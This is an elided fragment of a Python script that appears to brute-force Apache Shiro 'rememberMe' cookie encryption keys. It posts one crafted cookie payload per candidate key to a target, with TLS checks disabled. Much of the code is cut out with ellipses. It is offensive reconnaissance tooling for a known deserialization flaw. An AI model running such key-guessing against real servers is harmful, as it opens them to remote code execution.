...
checkdata = ""

def getKey(url,ciphertype,data):

    if data!="":
        r1 = requests.post(target, cookies={'rememberMe': "123"}, timeout=10, proxies=PROXY,
                          verify=False, headers=myheader, allow_redirects=False,data=data)
    ...
    try:
        for key in keys:
            ...
            print(payload)
            if data != "":
                r = requests.post(target, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
                                 verify=False, headers=myheader, allow_redirects=False,data=data)  # 发送验证请求
...
if __name__ == '__main__':
    ...
    getKey(target,args.ciphertype,args.data)
